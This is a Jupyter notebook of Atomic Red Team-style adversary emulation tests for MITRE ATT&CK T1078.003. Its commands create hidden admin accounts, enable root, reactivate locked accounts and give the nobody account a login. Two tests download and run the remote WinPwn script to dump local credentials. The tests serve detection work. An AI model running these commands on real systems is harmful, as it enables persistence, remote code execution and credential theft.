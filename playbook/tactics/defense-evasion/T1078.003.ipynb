{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "325277fa",
   "metadata": {},
   "source": "# T1078.003 - Local Accounts\nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. "
  },
  {
   "cell_type": "markdown",
   "id": "530df81f",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "4e348cf6",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create local account with admin privileges",
    "After execution the new account will be active and added to the Administrators group",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user art-test /add\nnet user art-test -4RTisCool!-321\nnet localgroup administrators art-test /add```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b85a6bdc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "87ec5a86",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e311f9e7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "76e85d22",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Create local account with admin privileges - MacOS",
    "After execution the new account will be active and added to the Administrators group",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "595292c4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "6f3d3ba4",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsudo dscl . -delete /Users/AtomicUser```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6f090a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "daefbdbf",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create local account with admin privileges using sysadminctl utility - MacOS",
    "After execution the new account will be active and added to the Administrators group",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a3c2c24",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "bb3f6218",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsysadminctl interactive -deleteUser art-tester```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f1e6287",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ad30f1bf",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Enable root account using dsenableroot utility - MacOS",
    "After execution the current/new user will have root access",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ca5c314",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "2a1510f6",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\ndsenableroot -d #current user\ndsenableroot -d -u art-tester -p art-tester #new user```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e64dda9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "66551d93",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Add a new/existing user to the admin group using dseditgroup utility - macOS",
    "After execution the current/new user will be added to the Admin group",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndseditgroup -o edit -a art-user -t user admin```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e8f0a53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "46d7afc6",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\ndseditgroup -o edit -d art-user -t user admin```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc9ddc1b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "29ef957e",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - Loot local Credentials - powerhell kittie",
    "Loot local Credentials - powerhell kittie technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48700c9b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "149465c8",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - Loot local Credentials - Safetykatz",
    "Loot local Credentials - Safetykatz technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7964286",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "e528c0d5",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Create local account (Linux)",
    "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\npassword=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba1de110",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "0ec16566",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\n[ \"$(uname)\" = 'Linux' ] && userdel art -rf || rmuser -y art\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d978986",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0ff382d0",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Reactivate a locked/expired account (Linux)",
    "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nuseradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu art\nwhoami\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5913b74",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "75e0f2c7",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nuserdel -r art \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74a3b868",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cc58d103",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Reactivate a locked/expired account (FreeBSD)",
    "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\npw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2555377c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "e1ec5024",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrmuser -y art \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "904ba6f4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "456224e5",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Login as nobody (Linux)",
    "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu nobody\nwhoami\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a008af6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "51d3c7b8",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nchsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59c5fbca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d06e5c3f",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Login as nobody (freebsd)",
    "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "185161d3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "089819c9",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\npw usermod nobody -s /usr/sbin/nologin\ncat /etc/passwd |grep nobody\n# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "079b98cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "584ea642",
   "metadata": {},
   "source": "## Detection\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}